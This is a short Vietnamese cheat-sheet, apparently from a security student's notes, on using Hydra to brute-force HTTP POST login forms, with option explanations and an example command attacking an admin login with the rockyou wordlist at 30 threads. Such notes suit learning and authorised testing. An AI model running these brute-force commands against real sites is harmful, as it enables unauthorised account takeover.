```Bash
hydra -L <username list> -P <passlist> <host> http/s-post-form "/path:field1=^USER^&field2=^PASS^: fail_string"
```

> **Lưu ý**: **-L** và **-P** có thể được viết thường thành **-l** và **-p** nếu đã có sẵn 1 trong 2 trường

- **Các options**:
    - -f : tìm được password dừng luôn
    - -F : in toàn bộ respond từ server khi login thất bại; nên dùng chung với -vV
    - -t <số lượng> : số luồng chạy cùng lúc
    - **!** dùng để tạo phủ định với fail_string

> [!important]
> 
> ## Ví dụ:
> 
> ```Bash
> hydra -l admin -P /usr/share/wordlist/rockyou.txt example.com http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -t 30
> ```
> 
> > Muốn biết path nên bắt request trước (**Burp Suite**/**CAIDO**)